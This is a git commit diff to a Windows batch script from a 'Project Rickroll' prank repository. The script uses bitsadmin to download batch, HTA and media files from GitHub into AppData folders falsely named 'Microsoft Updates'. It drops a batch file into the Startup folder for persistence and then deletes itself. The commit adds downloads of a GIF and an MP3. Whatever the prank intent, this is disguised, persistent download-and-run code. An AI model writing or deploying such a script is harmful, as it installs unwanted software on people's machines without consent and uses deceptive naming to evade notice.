1b6c6d70759bc67d75c95a22bfb9a0e6047d233b
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-11 11:31:33 +0800

    Update startup.bat

--- Projects/Project Rickroll/startup.bat
+++ Projects/Project Rickroll/startup.bat
@@ -5,5 +5,7 @@ cls
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/refs/heads/main/Projects/Project%20Rickroll/bgwork.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrklbg.bat"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/refs/heads/main/Projects/Project%20Rickroll/rick.hta" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrkl.hta"
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/refs/heads/main/Projects/Project%20Rickroll/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/refs/heads/main/Projects/Project%20Rickroll/msrkl.gif" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.gif"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/refs/heads/main/Projects/Project%20Rickroll/msrkl.mp3" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\Update\Services\msrkl.mp3"
 
 del startup.bat
